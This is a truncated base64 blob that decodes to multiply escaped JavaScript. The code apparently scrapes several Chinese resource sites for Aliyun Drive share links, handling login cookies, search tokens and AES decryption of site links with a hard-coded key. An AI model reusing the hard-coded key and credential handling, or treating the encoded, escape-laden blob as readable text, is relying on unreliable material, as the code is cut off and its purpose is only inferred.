AgICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3poYW96aXl1YW4ubWUvbG9naW4uaHRtbCcsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBcXFxcXFxcInVwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHNcXFxcXFxcIjogXFxcXFxcXCIxXFxcXFxcXCJcXFxcbiAgICAgICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICAgICAgYm9keTogYmFzZTY0RGVjb2RlKHVzZXIpLFxcXFxuICAgICAgICAgICAgICAgICAgICBtZXRob2Q6ICdQT1NUJyxcXFxcbiAgICAgICAgICAgICAgICAgICAgb25seUhlYWRlcnM6IHRydWUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHdpdGhIZWFkZXJzOiB0cnVlXFxcXG4gICAgICAgICAgICAgICAgfSkpLmpvaW4oJzsnKTtcXFxcbiAgICAgICAgICAgICAgICBzZXRJdGVtKFxcXFxcXFwienp5Y29va2VcXFxcXFxcIiwgY29vayk7XFxcXG4gICAgICAgICAgICAgICAgbG9nKFxcXFxcXFwi5om+6LWE5rqQ55m75YWlXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGh0bWwgPSBnZXRodG1sKCk7XFxcXG4gICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgIGxldCBhcnIgPSBwZGZhKGh0bWwsIFxcXFxcXFwiYm9keSYmLm5ld3NMaXN0JiZsaTpub3QoOmZpcnN0LWNoaWxkKVxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgIC8vbG9nKGFycik7XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBhcnIubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaXQgPSBhcnJbaV07XFxcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBwZGZoKGl0LCBcXFxcXFxcImEmJmhyZWZcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgaWYgKHUgPT0gbnVsbCkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgdSA9IFxcXFxcXFwiaHR0cHM6Ly96aGFveml5dWFuLm1lL1xcXFxcXFwiICsgdTtcXFxcbiAgICAgICAgICAgICAgICAvL2xvZyh1KTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdGl0bGUgPSBwZGZoKGl0LCBcXFxcXFxcIi5uZXdzX3RleHQmJmgzJiZUZXh0XFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICAgIGlmICghdGl0bGUpIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgZGVzYzogcGRmaChpdCwgXFxcXFxcXCIubmV3c190ZXh0JiZwJiZUZXh0XFxcXFxcXCIpLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHVcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIHJldHVybiBkO1xcXFxuICAgICAgICB9LFxcXFxuICAgICAgICBmaW5kQWxpVXJsKGlucHV0KSB7XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QoaW5wdXQpO1xcXFxuICAgICAgICAgICAgdmFyIF9saW5rcyA9IGh0bWwubWF0Y2goL2h0dHBzOlxcXFxcXFxcL1xcXFxcXFxcLyh3d3dcXFxcXFxcXC5hbGl5dW5kcml2ZVxcXFxcXFxcLmNvbVxcXFxcXFxcL3N8YWx5d3BcXFxcXFxcXC5uZXQpXFxcXFxcXFwvXFxcXFxcXFx3Ki9nKSB8fCBbXTtcXFxcblxcXFxuICAgICAgICAgICAgaWYgKF9saW5rcy5sZW5ndGggPiAwKSB7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gX2xpbmtzWzBdO1xcXFxuICAgICAgICAgICAgfSBlbHNlIHtcXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gaW5wdXQ7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCLlsI/nurjmnaFcXFxcXFxcIixcXFxcbiAgICAgICAgcGFnZTogZmFsc2UsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGxldCBhbGlVdGlsID0gJC5yZXF1aXJlKFxcXFxcXFwiYWxpVXRpbFxcXFxcXFwiKTtcXFxcblxcXFxuICAgICAgICAgICAgZnVuY3Rpb24gZ2V0dG9rZW4oKSB7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGdldE15VmFyKCd4enl0b2tlbicsICcnKS5sZW5ndGggPT0gMCkge1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdG9rZW4gPSBKU09OLnBhcnNlKHBvc3QoJ2h0dHBzOi8vZ2l0Y2FmZS5uZXQvdG9vbC9hbGlwYXBlci8nLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly91LmdpdGNhZmUuaW5rLydcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBib2R5OiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYWN0aW9uOiAnZ2V0X3Rva2VuJ1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICB9KSkuZGF0YTtcXFxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ3h6dHRva2VuJywgdG9rZW4pO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gZ2V0TXlWYXIoJ3h6dHRva2VuJywgJycpO1xcXFxuICAgICAgICAgICAgfVxcXFxuXFxcXG4gICAgICAgICAgICBmdW5jdGlvbiBjYXRfY29kZShhKSB7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGQsIGUsIGIgPSBbXFxcXFxcXCLljY7or63nlLXop4ZcXFxcXFxcIiwgXFxcXFxcXCLml6Xpn6nnlLXop4ZcXFxcXFxcIiwgXFxcXFxcXCLmrKfnvo7nlLXop4ZcXFxcXFxcIiwgXFxcXFxcXCLlhbbku5bnlLXop4ZcXFxcXFxcIiwgXFxcXFxcXCLljY7or63nlLXlvbFcXFxcXFxcIiwgXFxcXFxcXCLml6Xpn6nnlLXlvbFcXFxcXFxcIiwgXFxcXFxcXCLmrKfnvo7nlLXlvbFcXFxcXFxcIiwgXFxcXFxcXCLlhbbku5bnlLXlvbFcXFxcXFxcIiwgXFxcXFxcXCLljY7or63liqjmvKtcXFxcXFxcIiwgXFxcXFxcXCLml6Xpn6nliqjmvKtcXFxcXFxcIiwgXFxcXFxcXCLmrKfnvo7liqjmvKtcXFxcXFxcIiwgXFxcXFxcXCLnuqrlvZXniYdcXFxcXFxcIiwgXFxcXFxcXCLnu7zoibrniYdcXFxcXFxcIiwgXFxcXFxcXCLmlZnogrLln7norq1cXFxcXFxcIiwgXFxcXFxcXCLlhbbku5bop4bpopFcXFxcXFxcIiwgXFxcXFxcXCLljY7or63pn7PkuZBcXFxcXFxcIiwgXFxcXFxcXCLml6Xpn6npn7PkuZBcXFxcXFxcIiwgXFxcXFxcXCLmrKfnvo7pn7PkuZBcXFxcXFxcIiwgXFxcXFxcXCLlhbbku5bpn7PkuZBcXFxcXFxcIiwgXFxcXFxcXCLlqLHkuZDova/ku7ZcXFxcXFxcIiwgXFxcXFxcXCLns7vnu5/ova/ku7ZcXFxcXFxcIiwgXFxcXFxcXCLnvZHnu5zova/ku7ZcXFxcXFxcIiwgXFxcXFxcXCLlip7lhazova/ku7ZcXFxcXFxcIiwgXFxcXFxcXCLlhbbku5bova/ku7ZcXFxcXFxcIiwgXFxcXFxcXCLmvKvnlLtcXFxcXFxcIiwgXFxcXFxcXCLlsI/or7RcXFxcXFxcIiwgXFxcXFxcXCLlh7rniYjkuaZcXFxcXFxcIiwgXFxcXFxcXCLnn6Xor4bln7norq1cXFxcXFxcIiwgXFxcXFxcXCLlhbbku5bmlofmoaNcXFxcXFxcIiwgXFxcXFxcXCLlo4HnurhcXFxcXFxcIiwgXFxcXFxcXCLkurrnialcXFxcXFxcIiwgXFxcXFxcXCLpo47mma9cXFxcXFxcIiwgXFxcXFxcXCLlhbbku5blm77niYdcXFxcXFxcIiwgXFxcXFxcXCLlhbbku5ZcXFxcXFxcIl0sXFxcXG4gICAgICAgICAgICAgICAgICAgIGMgPSBbXFxcXFxcXCJoeWRzXFxcXFxcXCIsIFxcXFxcXFwicmhkc1xcXFxcXFwiLCBcXFxcXFxcIm9tZHNcXFxcXFxcIiwgXFxcXFxcXCJxdGRzXFxcXFxcXCIsIFxcXFxcXFwiaHlkeVxcXFxcXFwiLCBcXFxcXFxcInJoZHlcXFxcXFxcIiwgXFxcXFxcXCJvbWR5XFxcXFxcXCIsIFxcXFxcXFwicXRkeVxcXFxcXFwiLCBcXFxcXFxcImh5ZG1cXFxcXFxcIiwgXFxcXFxcXCJyaGRtXFxcXFxcXCIsIFxcXFxcXFwib21kbVxcXFxcXFwiLCBcXFxcXFxcImpscFxcXFxcXFwiLCBcXFxcXFxcInp5cFxcXFxcXFwiLCBcXFxcXFxcImp5cHhcXFxcXFxcIiwgXFxcXFxcXCJxdHNwXFxcXFxcXCIsIFxcXFxcXFwiaHl5eVxcXFxcXFwiLCBcXFxcXFxcInJoeXlcXFxcXFxcIiwgXFxcXFxcXCJvbXl5XFxcXFxcXCIsIFxcXFxcXFwicXR5eVxcXFxcXFwiLCBcXFxcXFxcImtmcmpcXFxcXFxcIiwgXFxcXFxcXCJ4dHJqXFxcXFxcXCIsIFxcXFxcXFwid2xyalxcXFxcXFwiLCBcXFxcXFxcImJncmpcXFxcXFxcIiwgXFxcXFxcXCJxdHJqXFxcXFxcXCIsIFxcXFxcXFwibWhcXFxcXFxcIiwgXFxcXFxcXCJ4c1xcXFxcXFwiLCBcXFxcXFxcImNic1xcXFxcXFwiLCBcXFxcXFxcInpzcHhcXFxcXFxcIiwgXFxcXFxcXCJxdHdkXFxcXFxcXCIsIFxcXFxcXFwiYnpcXFxcXFxcIiwgXFxcXFxcXCJyd1xcXFxcXFwiLCBcXFxcXFxcImZqXFxcXFxcXCIsIFxcXFxcXFwicXR0cFxcXFxcXFwiLCBcXFxcXFxcInF0XFxcXFxcXCJdO1xcXFxuICAgICAgICAgICAgICAgIGZvciAoZCA9IDAsIGUgPSBjLmxlbmd0aDsgZSA+IGQ7IGQrKylcXFxcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNbZF0gPT0gYSkgcmV0dXJuIGJbZF07XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBsZXQgZCA9IFtdO1xcXFxuICAgICAgICAgICAgbGV0IGh0bWwgPSBwb3N0KFxcXFxcXFwiaHR0cHM6Ly9naXRjYWZlLm5ldC90b29sL2FsaXBhcGVyL1xcXFxcXFwiLCB7XFxcXG4gICAgICAgICAgICAgICAgaGVhZGVyczoge1xcXFxuICAgICAgICAgICAgICAgICAgICAnUmVmZXJlcic6ICdodHRwczovL3UuZ2l0Y2FmZS5pbmsvJ1xcXFxuICAgICAgICAgICAgICAgIH0sXFxcXG4gICAgICAgICAgICAgICAgYm9keToge1xcXFxuICAgICAgICAgICAgICAgICAgICBhY3Rpb246IFxcXFxcXFwic2VhcmNoXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIGZyb206IFxcXFxcXFwid2ViXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICAgICAgICAgIHRva2VuOiBnZXR0b2tlbigpLFxcXFxuICAgICAgICAgICAgICAgICAgICBrZXl3b3JkOiBzXFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIGxldCBsaXN0ID0gSlNPTi5wYXJzZShodG1sKTtcXFxcbiAgICAgICAgICAgIGlmIChsaXN0LmRhdGEpIHtcXFxcbiAgICAgICAgICAgICAgICBsaXN0ID0gbGlzdC5kYXRhO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsaXN0Lmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gbGlzdFtpXVxcXFxuICAgICAgICAgICAgICAgIGxldCB0aXRsZSA9IGl0LnRpdGxlO1xcXFxuICAgICAgICAgICAgICAgIGxldCBtdXJsID0gJ2h0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zLycgKyBpdC5hbGlrZXlcXFxcbiAgICAgICAgICAgICAgICBpZiAoIWFsaVV0aWwuY2hlY2thbGkobXVybCkpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGlmICh0aXRsZS5pbmNsdWRlcyhzKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oiaIFxcXFxcXFwiICsgdGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBjYXRfY29kZShpdC5jYXQpLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXM6IGl0LmRlc1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHVybDogbXVybFxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gZDtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG4gICAge1xcXFxuICAgICAgICBuYW1lOiBcXFxcXFxcIueOqeWBtuWTpeWTpVxcXFxcXFwiLFxcXFxuICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcXFxcXCJodHRwOi8vd29nZy54eXovaW5kZXgucGhwL3ZvZHNlYXJjaC9cXFxcXFxcIiArIHMgKyBcXFxcXFxcIi0tLS0tLS0tLS1cXFxcXFxcIiArIHBhZ2UgKyBcXFxcXFxcIi0tLS5odG1sXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsLCB7fSk7XFxcXG4gICAgICAgICAgICBsZXQgYXJyID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCAnLm1vZHVsZS1pdGVtcyYmLm1vZHVsZS1zZWFyY2gtaXRlbScpO1xcXFxuICAgICAgICAgICAgLy9sb2coYXJyKTtcXFxcbiAgICAgICAgICAgIGxldCBkID0gW107XFxcXG4gICAgICAgICAgICBsZXQgYmV0ID0gW107XFxcXG4gICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFyci5sZW5ndGg7IGkrKykge1xcXFxuICAgICAgICAgICAgICAgIGxldCBpdCA9IGFycltpXTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdXRpdGxlID0gcGFyc2VEb21Gb3JIdG1sKGl0LCAnaDMmJmEmJlRleHQnKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdXNlcmlhbCA9IHBhcnNlRG9tRm9ySHRtbChpdCwgJy52aWRlby1zZXJpYWwmJlRleHQnKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdWltYWdlID0gcGFyc2VEb20oaXQsICcubGF6eWxvYWQmJmRhdGEtc3JjJywgJ2h0dHA6Ly93b2dnLnh5ei8nKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tKGl0LCAnaDMmJmEmJmhyZWYnLCAnaHR0cDovL3dvZ2cueHl6LycpO1xcXFxuICAgICAgICAgICAgICAgIC8vbGV0IGRldCA9IHJlcXVlc3QodSwge30pO1xcXFxuICAgICAgICAgICAgICAgIGJldC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHV0aXRsZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdXJsOiB1LFxcXFxuICAgICAgICAgICAgICAgICAgICBpbWFnZTogdWltYWdlLFxcXFxuICAgICAgICAgICAgICAgICAgICBkZXNjOiB1c2VyaWFsXFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICBpZiAoYmV0Lmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgYmV0aCA9IGJhdGNoRmV0Y2goYmV0KTtcXFxcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGJldGgubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGxpc3QgPSBwYXJzZURvbUZvckFycmF5KGJldGhbaV0sICcubW9kdWxlLXBsYXllci1saXN0JiZwJylcXFxcbiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCBsaXN0Lmxlbmd0aDsgaisrKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCAncCYmVGV4dCcpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCF1LmluY2x1ZGVzKFxcXFxcXFwiL3MvXFxcXFxcXCIpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBiZXRbaV0udGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGljX3VybDogYmV0W2ldLmltYWdlLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVybDogdSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXNjOiBiZXRbaV0uZGVzYyArICdcXFxcXFxcXG4nICsgdSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuXFxcXG4gICAgICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICByZXR1cm4gZDtcXFxcbiAgICAgICAgfVxcXFxuICAgIH0sXFxcXG4gICAge1xcXFxuICAgICAgICBuYW1lOiBcXFxcXFxcIumYv+mHjOS6keebmOe9kVxcXFxcXFwiLFxcXFxuICAgICAgICBwYWdlOiB0cnVlLFxcXFxuICAgICAgICBmaW5kOiBmdW5jdGlvbihzLCBwYWdlKSB7XFxcXG4gICAgICAgICAgICBsZXQgdXJsID0gXFxcXFxcXCJodHRwczovL3d3dy5hbHlwdy5jbi9zZWFyY2gucGhwP3E9XFxcXFxcXCIgKyBzICsgXFxcXFxcXCImcGFnZT1cXFxcXFxcIiArIHBhZ2U7XFxcXG4gICAgICAgICAgICBsZXQgaHRtbCA9IHJlcXVlc3QodXJsLCB7fSk7XFxcXG4gICAgICAgICAgICBsZXQgYXJyID0gcGFyc2VEb21Gb3JBcnJheShodG1sLCAnLmxpc3QmJmxpJyk7XFxcXG4gICAgICAgICAgICAvL2xvZyhhcnIpO1xcXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgIGxldCBiZXQgPSBbXTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1dGl0bGUgPSBwYXJzZURvbUZvckh0bWwoaXQsICdhJiZ0aXRsZScpO1xcXFxuICAgICAgICAgICAgICAgIGxldCB1c2VyaWFsID0gcGFyc2VEb21Gb3JIdG1sKGl0LCAnLmZhLWNsb2NrLW8mJlRleHQnKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdWltYWdlID0gcGFyc2VEb20oaXQsICdpbWcmJnNyYycsICdodHRwczovL3d3dy5hbHlwdy5jbi8nKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tKGl0LCAnYSYmaHJlZicsICdodHRwczovL3d3dy5hbHlwdy5jbi8nKTtcXFxcbiAgICAgICAgICAgICAgICAvL2xldCBkZXQgPSByZXF1ZXN0KHUsIHt9KTtcXFxcbiAgICAgICAgICAgICAgICBpZiAoIXV0aXRsZS5pbmNsdWRlcyhzKSkge1xcXFxuICAgICAgICAgICAgICAgICAgICBjb250aW51ZTtcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgYmV0LnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdXRpdGxlLFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxcXG4gICAgICAgICAgICAgICAgICAgIGltYWdlOiB1aW1hZ2UsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IHVzZXJpYWxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIC8vbG9nKGJldCk7XFxcXG4gICAgICAgICAgICBpZiAoYmV0Lmxlbmd0aCA+IDApIHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgYmV0aCA9IGJhdGNoRmV0Y2goYmV0KTtcXFxcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGJldGgubGVuZ3RoOyBpKyspIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGxpc3QgPSBwYXJzZURvbUZvckFycmF5KGJldGhbaV0sICdib2R5JiZhW2hyZWZePWh0dHBzOi8vd3d3LmFsaXl1bmRyaXZlLmNvbS9zL10nKVxcXFxuICAgICAgICAgICAgICAgICAgICAvL2xvZyhsaXN0KTtcXFxcbiAgICAgICAgICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCBsaXN0Lmxlbmd0aDsgaisrKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tRm9ySHRtbChsaXN0W2pdLCAnYSYmaHJlZicpO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogYmV0W2ldLnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBpY191cmw6IGJldFtpXS5pbWFnZSxcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVzYzogYmV0W2ldLmRlc2MgKyAnXFxcXFxcXFxuJyArIHUsXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCLlnJ/mi6jpvKBcXFxcXFxcIixcXFxcbiAgICAgICAgcGFnZTogZmFsc2UsXFxcXG4gICAgICAgIGZpbmQ6IGZ1bmN0aW9uKHMsIHBhZ2UpIHtcXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gZmV0Y2goJ2h0dHBzOi8vd3d3LnRic2R5LmNvbS9zZWFyY2guaHRtbD9rZXl3b3JkPScgKyBzICsgJyZjYXRlZ29yeT05ODM5MjAmZGF0YV90eXBlPTk4NzkxMCcsIHtcXFxcbiAgICAgICAgICAgICAgICBoZWFkZXJzOiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICdVc2VyLUFnZW50JzogUENfVUFcXFxcbiAgICAgICAgICAgICAgICB9XFxcXG4gICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgbGV0IGFyciA9IHBhcnNlRG9tRm9yQXJyYXkoaHRtbCwgJy5zZWFyY2hfcmVzdWx0X25ldGRpc2tfbGlzdCYmYScpO1xcXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgYXJyLmxlbmd0aDsgaSsrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGl0ID0gYXJyW2ldO1xcXFxuICAgICAgICAgICAgICAgIC8vbG9nKGl0KTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdSA9IHBhcnNlRG9tRm9ySHRtbChpdCwgJ2EmJmhyZWYnKTtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdGl0ID0gcGFyc2VEb21Gb3JIdG1sKGl0LCAnLm5ldGRpc2tfaXRlbV9kZXRhaWxfbmFtZSYmVGV4dCcpO1xcXFxuICAgICAgICAgICAgICAgIGlmICghdGl0LmluY2x1ZGVzKHMpKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICAvL2xvZyh1KTtcXFxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogdGl0LFxcXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHUsXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IFxcXFxcXFwiXFxcXFxcXFxuXFxcXFxcXCIgKyB1LFxcXFxuICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH1cXFxcbiAgICB9LFxcXFxuICAgIHtcXFxcbiAgICAgICAgbmFtZTogXFxcXFxcXCLpmL/ph4zmkJxcXFxcXFxcIixcXFxcbiAgICAgICAgcGFnZTogdHJ1ZSxcXFxcbiAgICAgICAgZmluZDogZnVuY3Rpb24ocywgcGFnZSkge1xcXFxuICAgICAgICAgICAgbGV0IGQgPSBbXTtcXFxcbiAgICAgICAgICAgIGxldCBodG1sID0gcmVxdWVzdCgnaHR0cHM6Ly9hbGlzby5jYy9zLycgKyBzICsgJy0nICsgcGFnZSArICctMC5odG1sJywge30pO1xcXFxuXFxcXG4gICAgICAgICAgICBsZXQgbGlzdCA9IHBhcnNlRG9tRm9yQXJyYXkoaHRtbCwgJy5zZWFyY2gtcmVzdWx0JiYucmVzb3VyY2UtaXRlbScpO1xcXFxuICAgICAgICAgICAgZm9yIChsZXQgaiA9IDA7IGogPCBsaXN0Lmxlbmd0aDsgaisrKSB7XFxcXG4gICAgICAgICAgICAgICAgbGV0IHUgPSBsaXN0W2pdO1xcXFxuICAgICAgICAgICAgICAgIGxldCB0aXQgPSBwYXJzZURvbUZvckh0bWwodSwgJ2gzJiZUZXh0Jyk7XFxcXG4gICAgICAgICAgICAgICAgaWYgKCF0aXQuaW5jbHVkZXMocykpIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgY29udGludWU7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiB0aXQsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogcGFyc2VEb20odSwgJ2gzJiZhJiZocmVmJywgJ2h0dHBzOi8vYWxpc28uY2MvJyksXFxcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IHBhcnNlRG9tRm9ySHRtbCh1LCAnLnRpbWUmJlRleHQnKSxcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcblxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgcmV0dXJuIGQ7XFxcXG4gICAgICAgIH0sXFxcXG4gICAgICAgIGZpbmRBbGlVcmwoaW5wdXQpIHtcXFxcbiAgICAgICAgICAgIGV2YWwoZ2V0Q3J5cHRvSlMoKSk7XFxcXG5cXFxcbiAgICAgICAgICAgIGZ1bmN0aW9uIGRlY3J5KHN0cikge1xcXFxuICAgICAgICAgICAgICAgIHZhciBrZXkgPSBDcnlwdG9KUy5lbmMuVXRmOC5wYXJzZShcXFxcXFxcIjlFQjIwRERGRDZBRkJENjhcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGVuY3J5cHRlZCA9IENyeXB0b0pTLkFFUy5kZWNyeXB0KHN0ciwga2V5LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgIGl2OiBrZXksX